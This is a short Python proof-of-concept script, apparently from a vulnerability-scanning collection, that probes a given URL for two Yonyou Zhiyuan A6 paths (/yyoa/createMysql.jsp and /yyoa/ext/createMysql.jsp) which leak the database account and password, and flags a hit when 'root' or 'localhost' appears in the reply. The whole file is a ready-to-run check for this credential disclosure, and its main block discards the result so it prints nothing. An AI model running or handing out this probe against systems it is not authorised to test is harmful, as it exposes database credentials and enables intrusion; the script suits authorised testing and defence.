#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友致远A6协同系统数据库账号泄露
referer: http://www.wooyun.org/bugs/wooyun-2010-0110538
author: Lucifer
description: 用友致远A6 /yyoa/createMysql.jsp,/yyoa/ext/createMysql.jsp存在数据库账号密码泄露。
'''
import sys
import requests



class yonyou_createMysql_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/yyoa/createMysql.jsp",
                    "/yyoa/ext/createMysql.jsp"]
        try:
            for payload in payloads:
                vulnurl = self.url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"root" in req.text or r"localhost" in req.text:
                    return "[+]存在用友致远A6协同系统数据库账号泄露...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = yonyou_createMysql_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()
